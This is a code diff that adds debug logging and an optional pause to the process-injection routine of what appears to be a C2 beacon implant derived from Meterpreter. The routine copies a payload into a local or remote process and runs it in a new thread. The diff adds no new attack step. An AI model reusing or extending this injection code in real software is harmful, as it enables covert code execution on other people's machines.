@@ -3,6 +3,7 @@
  * Threads. Taken from Meterpreter.
  */
 #include <stdlib.h>
+#include "spawn_trace.h"
 #include <stdio.h>
 #include <windows.h>
 #include "beacon.h"
@@ -158,6 +159,7 @@ BOOL inject_process_execute(INJECTCONTEXT * context, char * ptr, int offset, voi
 void __inject_process_logic(INJECTCONTEXT * context, char * buffer, int length, int offset, void * parameter) {
 	void * ptr;
 
+	spawn_log("inject_logic: entry len=", (long)length);
 	/* mirror the data */
 	if (context->samePid) {
 		ptr = local_mirror_data(buffer, length);
@@ -167,22 +169,26 @@ void __inject_process_logic(INJECTCONTEXT * context, char * buffer, int length, 
 	}
 
 	if (ptr == NULL) {
+		spawn_log("inject_logic: mirror FAILED", 0x7fffffff);
 		return;
 	}
+	spawn_log("inject_logic: mirror ok ptr=", (long)(long long)ptr);
 
 #ifdef INJECT_PREEXEC_PAUSE
 	/* observability window: lets an external snapshot tool read the mirrored
 	 * payload before the thread is created (vncdll host-death forensics) */
 	{
+		spawn_log("inject_logic: preexec pause", 0x7fffffff);
 		Sleep(3000);
 	}
 #endif
 
 	/* call our logic to execute code */
 	if (inject_process_execute(context, (char *)ptr, offset, parameter)) {
+		spawn_log("inject_logic: execute ok", 0x7fffffff);
 		return;
 	}
- /* TODO: what happens to ptr? From what I can see the allocated memory is lost as well as the handle to the thread. local - uses VirtualAlloc remote - uses VirtualAlloc or NTMAPVIEWOFSECTION */
+	spawn_log("inject_logic: execute FAILED err=", (long)GetLastError()); /* TODO: what happens to ptr? From what I can see the allocated memory is lost as well as the handle to the thread. local - uses VirtualAlloc remote - uses VirtualAlloc or NTMAPVIEWOFSECTION */
 
 	/* post an error staging PI failed... not 0x20 though */
 	post_error_dd(0x48, context->pid, GetLastError());
